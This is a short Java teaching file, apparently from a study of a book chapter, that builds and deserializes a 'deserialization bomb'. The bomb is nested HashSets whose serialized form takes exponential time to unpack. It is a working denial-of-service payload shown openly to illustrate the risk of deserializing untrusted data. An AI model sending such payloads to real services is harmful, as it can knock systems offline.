package chapter12.item85;
import static chapter12.Util.*;

import java.util.HashSet;
import java.util.Set;

/**
 * @Author Chuanan YANG
 * @DateTime 2019/9/7 22:04
 * @Description Deserialization bomb - deserializing this stream takes forever
 * @Version 0.0.1
 */
public class DeserializationBomb {
    public static void main(String[] args) throws Exception {
        System.out.println(bomb().length);
        deserialize(bomb());
    }

    static byte[] bomb() {
        Set<Object> root = new HashSet<>();
        Set<Object> s1 = root;
        Set<Object> s2 = new HashSet<>();
        for (int i = 0; i < 100; i++) {
            Set<Object> t1 = new HashSet<>();
            Set<Object> t2 = new HashSet<>();
            // make it not equal to t2
            t1.add("foo");
            s1.add(t1);
            s1.add(t2);
            s2.add(t1);
            s2.add(t2);
            s1 = t1;
            s2 = t2;
        }
        return serialize(root);
    }
}
